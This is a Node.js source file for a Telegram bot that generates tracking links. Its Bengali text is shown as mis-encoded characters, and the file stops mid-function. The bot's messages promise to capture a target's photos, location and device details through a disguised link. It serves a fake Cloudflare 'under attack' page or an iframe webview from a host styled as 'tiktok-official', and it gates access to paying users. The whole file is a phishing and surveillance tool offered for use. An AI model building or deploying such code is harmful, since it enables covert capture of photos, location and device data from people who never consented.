const fs = require("fs");
const express = require("express");
var cors = require('cors');
var bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot(process.env["bot"], {polling: true}); 
var jsonParser=bodyParser.json({limit:1024*1024*20, type:'application/json'});
var urlencodedParser=bodyParser.urlencoded({ extended:true,limit:1024*1024*20,type:'application/x-www-form-urlencoded' });
const app = express();
app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());
app.set("view engine", "ejs");

//Modify your URL here
var hostURL="https://tiktok-official.onrender.com";
var usecodetabs=false;

// ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ Telegram User ID, ‡¶Ø‡¶æ‡¶ï‡ßá Bot ‡¶è‡¶∞ ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶°‡¶Æ‡¶ø‡¶® ‡¶¨‡¶æ‡¶®‡¶æ‡¶®‡ßã ‡¶π‡¶¨‡ßá
const ownerId = 6246410156;

// ‡¶Ö‡¶®‡ßÅ‡¶Æ‡ßã‡¶¶‡¶ø‡¶§ ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞‡¶ï‡¶æ‡¶∞‡ßÄ‡¶¶‡ßá‡¶∞ ‡¶§‡¶æ‡¶≤‡¶ø‡¶ï‡¶æ ‡¶≤‡ßã‡¶° ‡¶ï‡¶∞‡¶æ (‡¶¨‡¶ü ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞‡ßá‡¶∞ ‡¶Ö‡¶®‡ßÅ‡¶Æ‡¶§‡¶ø)
let allowedUsers = {};
try {
    allowedUsers = JSON.parse(fs.readFileSync('users.json', 'utf8'));
} catch (error) {
    allowedUsers[ownerId] = {
        expires: 'forever'
    };
    fs.writeFileSync('users.json', JSON.stringify(allowedUsers, null, 2));
}

// ‡¶∏‡¶ï‡¶≤ ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞‡¶ï‡¶æ‡¶∞‡ßÄ‡¶¶‡ßá‡¶∞ ‡¶§‡¶æ‡¶≤‡¶ø‡¶ï‡¶æ ‡¶≤‡ßã‡¶° ‡¶ï‡¶∞‡¶æ (‡¶¨‡ßç‡¶∞‡¶°‡¶ï‡¶æ‡¶∏‡ßç‡¶ü‡ßá‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø)
let allUsers = new Set();
try {
    const savedUsers = JSON.parse(fs.readFileSync('all_users.json', 'utf8'));
    allUsers = new Set(savedUsers);
} catch (error) {
    // ‡¶Ø‡¶¶‡¶ø ‡¶´‡¶æ‡¶á‡¶≤ ‡¶®‡¶æ ‡¶•‡¶æ‡¶ï‡ßá, ‡¶è‡¶ï‡¶ü‡¶ø ‡¶´‡¶æ‡¶Å‡¶ï‡¶æ ‡¶´‡¶æ‡¶á‡¶≤ ‡¶§‡ßà‡¶∞‡¶ø ‡¶ï‡¶∞‡¶æ ‡¶π‡¶¨‡ßá‡•§
    fs.writeFileSync('all_users.json', JSON.stringify(Array.from(allUsers), null, 2));
}

// ‡¶∏‡¶ï‡¶≤ ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞‡¶ï‡¶æ‡¶∞‡ßÄ‡¶¶‡ßá‡¶∞ ‡¶§‡¶æ‡¶≤‡¶ø‡¶ï‡¶æ ‡¶∏‡ßá‡¶≠ ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®
function saveAllUsers() {
    fs.writeFileSync('all_users.json', JSON.stringify(Array.from(allUsers), null, 2));
}

// Bot ‡¶ï‡¶ñ‡¶® ‡¶ö‡¶æ‡¶≤‡ßÅ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá, ‡¶§‡¶æ ‡¶ü‡ßç‡¶∞‡ßç‡¶Ø‡¶æ‡¶ï ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø
const startTime = new Date();

// ‡¶á‡¶â‡¶ú‡¶æ‡¶∞‡¶ï‡ßá ‡¶Ö‡¶®‡ßÅ‡¶Æ‡¶§‡¶ø ‡¶Ü‡¶õ‡ßá ‡¶ï‡¶ø‡¶®‡¶æ ‡¶ö‡ßá‡¶ï ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®
function isAllowed(userId) {
    if (userId === ownerId) {
        return true;
    }
    const user = allowedUsers[userId];
    if (!user) {
        return false;
    }
    if (user.expires === 'forever') {
        return true;
    }
    return new Date() < new Date(user.expires);
}

// ‡¶Ö‡¶®‡ßÅ‡¶Æ‡ßã‡¶¶‡¶ø‡¶§ ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞‡¶ï‡¶æ‡¶∞‡ßÄ‡¶¶‡ßá‡¶∞ ‡¶§‡¶æ‡¶≤‡¶ø‡¶ï‡¶æ ‡¶∏‡ßá‡¶≠ ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®
function saveAllowedUsers() {
    fs.writeFileSync('users.json', JSON.stringify(allowedUsers, null, 2));
}

// ‚≠ê ‡¶õ‡¶¨‡¶ø ‡¶∏‡¶π ‡¶¨‡ßç‡¶∞‡¶°‡¶ï‡¶æ‡¶∏‡ßç‡¶ü ‡¶´‡¶æ‡¶Ç‡¶∂‡¶® (‡¶∏‡¶ï‡¶≤ ‡¶á‡¶â‡¶ú‡¶æ‡¶∞‡ßá‡¶∞ ‡¶ï‡¶æ‡¶õ‡ßá ‡¶Ø‡¶æ‡¶¨‡ßá, ‡¶Ö‡¶®‡ßÅ‡¶Æ‡¶§‡¶ø ‡¶¨‡¶ø‡¶¨‡ßá‡¶ö‡¶®‡¶æ ‡¶ï‡¶∞‡¶æ ‡¶π‡¶¨‡ßá ‡¶®‡¶æ)
async function broadcastToAllUsers(adminChatId, message, photoFileIdOrUrl = null) {
    const userIds = Array.from(allUsers);
    let successCount = 0;
    let failedCount = 0;

    bot.sendMessage(adminChatId, `üì£ ${userIds.length} ‡¶ú‡¶® ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞‡¶ï‡¶æ‡¶∞‡ßÄ‡¶ï‡ßá ‡¶¨‡¶æ‡¶∞‡ßç‡¶§‡¶æ/‡¶õ‡¶¨‡¶ø ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã ‡¶∂‡ßÅ‡¶∞‡ßÅ ‡¶π‡¶ö‡ßç‡¶õ‡ßá...`);

    for (const userId of userIds) {
        const targetChatId = parseInt(userId, 10);
        
        // ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶°‡¶Æ‡¶ø‡¶®‡¶ï‡ßá ‡¶®‡¶ø‡¶ú‡ßá‡¶∞ ‡¶ï‡¶æ‡¶õ‡ßá ‡¶Æ‡ßá‡¶∏‡ßá‡¶ú ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã ‡¶•‡ßá‡¶ï‡ßá ‡¶¨‡¶ø‡¶∞‡¶§ ‡¶∞‡¶æ‡¶ñ‡¶æ
        if (targetChatId === adminChatId) continue; 
        
        try {
            if (photoFileIdOrUrl) {
                await bot.sendPhoto(targetChatId, photoFileIdOrUrl, { 
                    caption: message 
                });
            } else {
                await bot.sendMessage(targetChatId, message);
            }
            successCount++;
            // üõë ‡¶´‡¶ø‡¶ï‡ßç‡¶∏: ‡¶∞‡ßá‡¶ü-‡¶≤‡¶ø‡¶Æ‡¶ø‡¶ü ‡¶è‡¶°‡¶º‡¶æ‡¶§‡ßá ‡¶Ö‡¶™‡ßá‡¶ï‡ßç‡¶∑‡¶æ‡¶∞ ‡¶∏‡¶Æ‡¶Ø‡¶º 300ms ‡¶ï‡¶∞‡¶æ ‡¶π‡¶≤‡ßã
            await new Promise(resolve => setTimeout(resolve, 300)); 
        } catch (error) {
            console.error(`Error sending message/photo to ${targetChatId}:`, error.message);
            failedCount++;
        }
    }

    bot.sendMessage(adminChatId, `‚úÖ ‡¶¨‡ßç‡¶∞‡¶°‡¶ï‡¶æ‡¶∏‡ßç‡¶ü ‡¶∏‡¶Æ‡ßç‡¶™‡¶®‡ßç‡¶®!\n‡¶∏‡¶´‡¶≤‡¶≠‡¶æ‡¶¨‡ßá ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá: ${successCount} ‡¶ú‡¶®‡ßá‡¶∞ ‡¶ï‡¶æ‡¶õ‡ßá‡•§\n‡¶¨‡ßç‡¶Ø‡¶∞‡ßç‡¶• ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá: ${failedCount} ‡¶ü‡¶ø‡•§`);
}
// ‚≠ê ‡¶¨‡ßç‡¶∞‡¶°‡¶ï‡¶æ‡¶∏‡ßç‡¶ü ‡¶´‡¶æ‡¶Ç‡¶∂‡¶® ‡¶∂‡ßá‡¶∑

app.get("/w/:path/:uri",(req,res)=>{
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}

if(req.params.path != null){
res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:usecodetabs});
}
else{
res.redirect("https://t.me/ehtool");
}
});

app.get("/c/:path/:uri",(req,res)=>{
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}


if(req.params.path != null){
res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:usecodetabs});
}
else{
res.redirect("https://t.me/ehtool");
}
});


bot.on('message', async (msg) => {
const chatId = msg.chat.id;

// üÜï ‡¶∏‡¶ï‡¶≤ ‡¶á‡¶â‡¶ú‡¶æ‡¶∞ ‡¶Ü‡¶á‡¶°‡¶ø ‡¶∏‡ßá‡¶≠ ‡¶ï‡¶∞‡¶æ
if (!allUsers.has(chatId.toString())) {
    allUsers.add(chatId.toString());
    saveAllUsers();
}

if(msg.text && msg.reply_to_message?.text=="üåê ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï‡¶ü‡¶ø ‡¶¶‡¶ø‡¶®"){
    createLink(chatId,msg.text); 
}

// üõë ‡¶´‡¶ø‡¶ï‡ßç‡¶∏: /start ‡¶ï‡¶Æ‡¶æ‡¶®‡ßç‡¶° ‡¶∏‡¶¨‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶ï‡¶æ‡¶ú ‡¶ï‡¶∞‡¶¨‡ßá‡•§
if(msg.text=="/start"){ 
var m={
reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_data:"crenew"}]]})
};

bot.sendMessage(chatId, `‡¶Ü‡¶∏‡¶∏‡¶æ‡¶≤‡¶æ‡¶Æ‡ßÅ ‡¶Ü‡¶≤‡¶æ‡¶á‡¶ï‡ßÅ‡¶Æ, ${msg.chat.first_name} ! , \n‡¶Ü‡¶™‡¶®‡¶ø ‡¶è‡¶á ‡¶¨‡¶ü ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞ ‡¶ï‡¶∞‡ßá ‡¶∏‡¶æ‡¶Æ‡¶æ‡¶®‡ßç‡¶Ø ‡¶è‡¶ï‡¶ü‡¶ø ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶™‡¶æ‡¶†‡¶ø‡¶Ø‡¶º‡ßá ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶∂‡¶§‡ßç‡¶∞‡ßÅ‡¶∞ ‡¶õ‡¶¨‡¶ø, ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶è‡¶¨‡¶Ç ‡¶§‡¶æ‡¶∞ ‡¶°‡¶ø‡¶≠‡¶æ‡¶á‡¶∏‡ßá‡¶∞ ‡¶¨‡¶ø‡¶≠‡¶ø‡¶®‡ßç‡¶® ‡¶§‡¶•‡ßç‡¶Ø ‡¶π‡ßç‡¶Ø‡¶æ‡¶ï ‡¶ï‡¶∞‡ßá ‡¶®‡¶ø‡¶§‡ßá ‡¶™‡¶æ‡¶∞‡¶¨‡ßá‡¶®‡•§\n\n‡¶Ü‡¶∞‡ßã‡¶ì ‡¶§‡¶•‡ßç‡¶Ø ‡¶ú‡¶æ‡¶®‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶ü‡¶æ‡¶á‡¶™ ‡¶ï‡¶∞‡ßÅ‡¶®, /help`,m);
}
// üÜï ‡¶®‡¶§‡ßÅ‡¶® ‡¶ï‡¶Æ‡¶æ‡¶®‡ßç‡¶°: /userlist (‡¶á‡¶â‡¶ú‡¶æ‡¶∞‡¶¶‡ßá‡¶∞ ‡¶Ü‡¶á‡¶°‡¶ø ‡¶¶‡ßá‡¶ñ‡¶æ‡¶¨‡ßá)
else if (msg.text === '/userlist') {
    if (chatId !== ownerId) {
        bot.sendMessage(chatId, '‡¶¶‡ßÅ‡¶É‡¶ñ‡¶ø‡¶§, ‡¶∂‡ßÅ‡¶ß‡ßÅ‡¶Æ‡¶æ‡¶§‡ßç‡¶∞ ‡¶¨‡¶ü‡ßá‡¶∞ ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶°‡¶Æ‡¶ø‡¶® ‡¶è‡¶á ‡¶ï‡¶Æ‡¶æ‡¶®‡ßç‡¶°‡¶ü‡¶ø ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞ ‡¶ï‡¶∞‡¶§‡ßá ‡¶™‡¶æ‡¶∞‡ßá‡¶®‡•§');
        return;
    }
    
    const userIds = Array.from(allUsers);
    const allowedCount = Object.keys(allowedUsers).length;
    
    let userList = `üë• ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶¨‡¶ü‡ßá‡¶∞ ‡¶∏‡¶ï‡¶≤ ‡¶á‡¶â‡¶ú‡¶æ‡¶∞‡ßá‡¶∞ (‡¶Ø‡¶æ‡¶∞‡¶æ ‡¶∏‡ßç‡¶ü‡¶æ‡¶∞‡ßç‡¶ü ‡¶ï‡¶∞‡ßá‡¶õ‡ßá) ‡¶§‡¶æ‡¶≤‡¶ø‡¶ï‡¶æ:\n\n`;
    userList += `‡¶∏‡¶∞‡ßç‡¶¨‡¶Æ‡ßã‡¶ü ‡¶á‡¶â‡¶ú‡¶æ‡¶∞ ‡¶Ø‡¶æ‡¶∞‡¶æ ‡¶¨‡¶ü ‡¶∂‡ßÅ‡¶∞‡ßÅ ‡¶ï‡¶∞‡ßá‡¶õ‡ßá: ${userIds.length} ‡¶ú‡¶®\n`;
    userList += `‡¶Ö‡¶®‡ßÅ‡¶Æ‡ßã‡¶¶‡¶ø‡¶§ (Allowed) ‡¶á‡¶â‡¶ú‡¶æ‡¶∞: ${allowedCount} ‡¶ú‡¶®\n\n`;

    // ‡¶Æ‡ßá‡¶∏‡ßá‡¶ú‡ßá‡¶∞ ‡¶Ü‡¶ï‡¶æ‡¶∞ ‡¶∏‡ßÄ‡¶Æ‡¶ø‡¶§ ‡¶∞‡¶æ‡¶ñ‡¶§‡ßá ‡¶™‡ßç‡¶∞‡¶•‡¶Æ 20 ‡¶ú‡¶® ‡¶á‡¶â‡¶ú‡¶æ‡¶∞‡¶ï‡ßá ‡¶¶‡ßá‡¶ñ‡¶æ‡¶®‡ßã ‡¶π‡¶ö‡ßç‡¶õ‡ßá
    const displayLimit = 20; 
    if (userIds.length > 0) {
        userList += `--- ‡¶™‡ßç‡¶∞‡¶•‡¶Æ ${Math.min(userIds.length, displayLimit)} ‡¶ú‡¶® ‡¶á‡¶â‡¶ú‡¶æ‡¶∞‡ßá‡¶∞ ID ‡¶ì ‡¶∏‡ßç‡¶ü‡ßç‡¶Ø‡¶æ‡¶ü‡¶æ‡¶∏ ---\n`;
        for (let i = 0; i < Math.min(userIds.length, displayLimit); i++) {
            const id = userIds[i];
            // ‡¶Ö‡¶®‡ßÅ‡¶Æ‡¶§‡¶ø ‡¶∏‡ßç‡¶ü‡ßç‡¶Ø‡¶æ‡¶ü‡¶æ‡¶∏ ‡¶ö‡ßá‡¶ï ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá
            const status = isAllowed(parseInt(id, 10)) ? '‚úÖ Allowed' : '‚ùå Disallowed';
            userList += `${i + 1}. \`${id}\` (${status})\n`;
        }
        if (userIds.length > displayLimit) {
            userList += `\n... ‡¶¨‡¶æ‡¶ï‡¶ø ${userIds.length - displayLimit} ‡¶ú‡¶®‡ßá‡¶∞ ‡¶§‡¶æ‡¶≤‡¶ø‡¶ï‡¶æ ‡¶¶‡ßá‡¶ñ‡¶æ‡¶®‡ßã ‡¶∏‡¶Æ‡ßç‡¶≠‡¶¨ ‡¶π‡¶ö‡ßç‡¶õ‡ßá ‡¶®‡¶æ‡•§`;
        }
    } else {
        userList += `‡¶¨‡¶∞‡ßç‡¶§‡¶Æ‡¶æ‡¶®‡ßá ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶¨‡¶ü‡ßá‡¶∞ ‡¶ï‡ßã‡¶®‡ßã ‡¶á‡¶â‡¶ú‡¶æ‡¶∞ ‡¶®‡ßá‡¶á‡•§`;
    }
    
    bot.sendMessage(chatId, userList, { parse_mode: 'Markdown' });
}
// ‡¶è‡¶á ‡¶™‡¶Ø‡¶º‡ßá‡¶®‡ßç‡¶ü‡ßá‡¶∞ ‡¶™‡¶∞, ‡¶Ø‡¶¶‡¶ø ‡¶á‡¶â‡¶ú‡¶æ‡¶∞ ‡¶Ö‡¶®‡ßÅ‡¶Æ‡¶§‡¶ø‡¶™‡ßç‡¶∞‡¶æ‡¶™‡ßç‡¶§ ‡¶®‡¶æ ‡¶π‡¶Ø‡¶º, ‡¶§‡¶¨‡ßá ‡¶§‡¶æ‡¶ï‡ßá ‡¶¨‡ßç‡¶≤‡¶ï ‡¶ï‡¶∞‡¶æ ‡¶π‡¶¨‡ßá‡•§
else if (!isAllowed(chatId)) {
    bot.sendMessage(chatId, `‡¶¶‡ßÅ‡¶É‡¶ñ‡¶ø‡¶§, ‡¶è‡¶á ‡¶¨‡¶ü‡¶ü‡¶ø ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞‡ßá‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶Ö‡¶®‡ßÅ‡¶Æ‡¶§‡¶ø ‡¶®‡ßá‡¶á‡•§üò¢\n\n‡¶è‡¶á ‡¶¨‡¶ü‡¶ü‡¶ø ‡¶Ü‡¶™‡¶®‡¶ø ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞ ‡¶ï‡¶∞‡¶§‡ßá ‡¶ö‡¶æ‡¶á‡¶≤‡ßá ‡¶®‡¶ø‡¶ö‡ßá ‡¶¶‡ßá‡¶ì‡¶Ø‡¶º‡¶æ ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶è‡¶∞ ‡¶Æ‡¶æ‡¶ß‡ßç‡¶Ø‡¶Æ‡ßá ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶°‡¶Æ‡¶ø‡¶®‡ßá‡¶∞ ‡¶∏‡¶æ‡¶•‡ßá ‡¶Ø‡ßã‡¶ó‡¶æ‡¶Ø‡ßã‡¶ó ‡¶ï‡¶∞‡ßÅ‡¶®‡•§üéâ\n\n\nTelegram : @ehtool_admin\n\nTelegram Channel : @ehtool\n\nFacebook : https://www.facebook.com/ehtoolbysakib`);
    return;
}
else if(msg.text=="/create"){
createNew(chatId);
}
else if(msg.text=="/help"){
bot.sendMessage(chatId,`‡¶è‡¶á ‡¶¨‡¶ü‡ßá‡¶∞ ‡¶Æ‡¶æ‡¶ß‡ßç‡¶Ø‡¶Æ‡ßá ‡¶Ü‡¶™‡¶®‡¶ø ‡¶ï‡ßá‡¶¨‡¶≤ ‡¶è‡¶ï‡¶ü‡¶ø ‡¶∏‡¶π‡¶ú ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶™‡¶æ‡¶†‡¶ø‡¶Ø‡¶º‡ßá ‡¶Æ‡¶æ‡¶®‡ßÅ‡¶∑‡¶¶‡ßá‡¶∞ ‡¶ü‡ßç‡¶∞‡ßç‡¶Ø‡¶æ‡¶ï ‡¶ï‡¶∞‡¶§‡ßá ‡¶™‡¶æ‡¶∞‡¶¨‡ßá‡¶®‡•§\n\n‡¶™‡ßç‡¶∞‡¶•‡¶Æ‡ßá /create ‡¶≤‡¶ø‡¶ñ‡ßá ‡¶∏‡ßá‡¶®‡ßç‡¶° ‡¶ï‡¶∞‡ßÅ‡¶®, ‡¶§‡¶æ‡¶∞‡¶™‡¶∞ ‡¶¨‡¶ü ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶ï‡¶æ‡¶õ‡ßá ‡¶è‡¶ï‡¶ü‡¶æ ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶ö‡¶æ‡¶á‡¶¨‡ßá, ‡¶Ü‡¶Æ‡¶ø ‡¶Ø‡ßá‡¶ï‡ßá‡¶®‡ßã ‡¶è‡¶ï‡¶ü‡¶æ ‡¶≠‡¶ø‡¶°‡¶ø‡¶ì ‡¶è‡¶∞ ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶¶‡¶ø‡¶Ø‡¶º‡ßá ‡¶¶‡¶ø‡¶¨‡ßá‡¶®‡•§\n‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶•‡ßá‡¶ï‡ßá ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶™‡ßá‡¶≤‡ßá ‡¶¨‡¶ü ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï‡ßá ‡¶Æ‡ßç‡¶Ø‡¶æ‡¶≤‡¶ì‡¶Ø‡¶º‡¶æ‡¶∞ ‡¶¨‡¶∏‡¶ø‡¶Ø‡¶º‡ßá ‡¶Ü‡¶™‡¶®‡¶æ‡¶ï‡ßá ‡¶Ü‡¶¨‡¶æ‡¶∞ ‡ß® ‡¶ü‡¶æ ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶¶‡¶ø‡¶¨‡ßá‡•§
\n\nSpecifications.
\n1. Cloudflare Link: ‡¶è‡¶á ‡¶™‡¶¶‡ßç‡¶ß‡¶§‡¶ø‡¶§‡ßá ‡¶§‡¶•‡ßç‡¶Ø ‡¶∏‡¶Ç‡¶ó‡ßç‡¶∞‡¶π‡ßá‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶è‡¶ï‡¶ü‡¶ø ‡¶ï‡ßç‡¶≤‡¶æ‡¶â‡¶°‡¶´‡ßç‡¶≤‡ßá‡¶Ø‡¶º‡¶æ‡¶∞ ‡¶Ü‡¶®‡ßç‡¶°‡¶æ‡¶∞ ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶ü‡¶æ‡¶ï ‡¶™‡ßÉ‡¶∑‡ßç‡¶†‡¶æ ‡¶¶‡ßá‡¶ñ‡¶æ‡¶®‡ßã ‡¶π‡¶¨‡ßá ‡¶è‡¶¨‡¶Ç ‡¶™‡¶∞‡ßá ‡¶≠‡¶ø‡¶ï‡¶ü‡¶ø‡¶Æ‡¶ï‡ßá ‡¶ó‡¶®‡ßç‡¶§‡¶¨‡ßç‡¶Ø‡¶∏‡ßç‡¶•‡¶≤‡ßá‡¶∞ URL-‡¶è ‡¶™‡ßÅ‡¶®‡¶É‡¶®‡¶ø‡¶∞‡ßç‡¶¶‡ßá‡¶∂‡¶ø‡¶§ ‡¶ï‡¶∞‡¶æ ‡¶π‡¶¨‡ßá‡•§
\n2. Webview Link: ‡¶è‡¶ü‡¶ø ‡¶§‡¶•‡ßç‡¶Ø ‡¶∏‡¶Ç‡¶ó‡ßç‡¶∞‡¶π‡ßá‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶Ü‡¶á‡¶´‡ßç‡¶∞‡ßá‡¶Æ ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞ ‡¶ï‡¶∞‡ßá ‡¶è‡¶ï‡¶ü‡¶ø ‡¶ì‡¶Ø‡¶º‡ßá‡¶¨‡¶∏‡¶æ‡¶á‡¶ü (Ex bing, Dating site ‡¶á‡¶§‡ßç‡¶Ø‡¶æ‡¶¶‡¶ø) ‡¶¶‡ßá‡¶ñ‡¶æ‡¶¨‡ßá‡•§.
( ‚ö†Ô∏è‡¶Ö‡¶®‡ßá‡¶ï ‡¶∏‡¶æ‡¶á‡¶ü‡ßá x-‡¶´‡ßç‡¶∞‡ßá‡¶Æ ‡¶π‡ßá‡¶°‡¶æ‡¶∞ ‡¶•‡¶æ‡¶ï‡¶≤‡ßá ‡¶è‡¶á ‡¶™‡¶¶‡ßç‡¶ß‡¶§‡¶ø‡¶§‡ßá ‡¶ï‡¶æ‡¶ú ‡¶®‡¶æ‡¶ì ‡¶ï‡¶∞‡¶§‡ßá ‡¶™‡¶æ‡¶∞‡ßá‡•§ ‡¶Ø‡ßá‡¶Æ‡¶® https://google.com )
\n\n‡¶Ö‡¶¨‡¶∂‡ßç‡¶Ø‡¶á ‡¶Ü‡¶Æ‡¶æ‡¶¶‡ßá‡¶∞ ‡¶ö‡ßç‡¶Ø‡¶æ‡¶®‡ßá‡¶≤‡ßá ‡¶ú‡¶Ø‡¶º‡ßá‡¶® ‡¶π‡¶¨‡ßá‡¶® ‡¶Ü‡¶∞‡ßã‡¶ì ‡¶ü‡ßÅ‡¶≤‡¶∏ ‡¶™‡¶æ‡¶ì‡¶Ø‡¶º‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø\n Telegram Channel : https://t.me/ehtool\nFacebook Page : https://www.facebook.com/profile.php?id=61580675061865
`);
}
// ‚≠ê ‡¶¨‡ßç‡¶∞‡¶°‡¶ï‡¶æ‡¶∏‡ßç‡¶ü ‡¶ï‡¶Æ‡¶æ‡¶®‡ßç‡¶° (‡¶õ‡¶¨‡¶ø ‡¶∏‡¶æ‡¶™‡ßã‡¶∞‡ßç‡¶ü‡ßá‡¶°)
else if (msg.text && msg.text.startsWith('/broadcast')) {
    if (chatId !== ownerId) {
        bot.sendMessage(chatId, '‡¶¶‡ßÅ‡¶É‡¶ñ‡¶ø‡¶§, ‡¶∂‡ßÅ‡¶ß‡ßÅ‡¶Æ‡¶æ‡¶§‡ßç‡¶∞ ‡¶¨‡¶ü‡ßá‡¶∞ ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶°‡¶Æ‡¶ø‡¶® ‡¶è‡¶á ‡¶ï‡¶Æ‡¶æ‡¶®‡ßç‡¶°‡¶ü‡¶ø ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞ ‡¶ï‡¶∞‡¶§‡ßá ‡¶™‡¶æ‡¶∞‡ßá‡¶®‡•§');
        return;
    }

    const broadcastMessage = msg.text.substring('/broadcast'.length).trim();
    let photoFileId = null;

    if (msg.reply_to_message && msg.reply_to_message.photo) {
        photoFileId = msg.reply_to_message.photo.pop().file_id;
    }

    if (broadcastMessage.length === 0 && !photoFileId) {
        bot.sendMessage(chatId, '‚ö†Ô∏è ‡¶∏‡¶†‡¶ø‡¶ï ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞:\n/broadcast <‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶¨‡¶æ‡¶∞‡ßç‡¶§‡¶æ‡¶∞ ‡¶ü‡ßá‡¶ï‡ßç‡¶∏‡¶ü>\n‡¶Ö‡¶•‡¶¨‡¶æ ‡¶è‡¶ï‡¶ü‡¶ø ‡¶õ‡¶¨‡¶ø‡¶§‡ßá ‡¶∞‡¶ø‡¶™‡ßç‡¶≤‡¶æ‡¶á ‡¶¶‡¶ø‡ßü‡ßá\n/broadcast <‡¶ï‡ßç‡¶Ø‡¶æ‡¶™‡¶∂‡¶®>');
        return;
    }

    broadcastToAllUsers(chatId, broadcastMessage, photoFileId);
}
// ‡¶®‡¶§‡ßÅ‡¶® ‡¶ï‡¶Æ‡¶æ‡¶®‡ßç‡¶°: /allow <chat_id> <time> 
else if (msg.text && msg.text.startsWith('/allow')) {
    if (chatId !== ownerId) {
        bot.sendMessage(chatId, '‡¶¶‡ßÅ‡¶É‡¶ñ‡¶ø‡¶§, ‡¶∂‡ßÅ‡¶ß‡ßÅ‡¶Æ‡¶æ‡¶§‡ßç‡¶∞ ‡¶¨‡¶ü‡ßá‡¶∞ ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶°‡¶Æ‡¶ø‡¶® ‡¶è‡¶á ‡¶ï‡¶Æ‡¶æ‡¶®‡ßç‡¶°‡¶ü‡¶ø ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞ ‡¶ï‡¶∞‡¶§‡ßá ‡¶™‡¶æ‡¶∞‡ßá‡¶®‡•§');
        return;
    }
    const parts = msg.text.split(' ');
    if (parts.length >= 2) {
        const userIdToAdd = parseInt(parts[1], 10);
        if (isNaN(userIdToAdd)) {
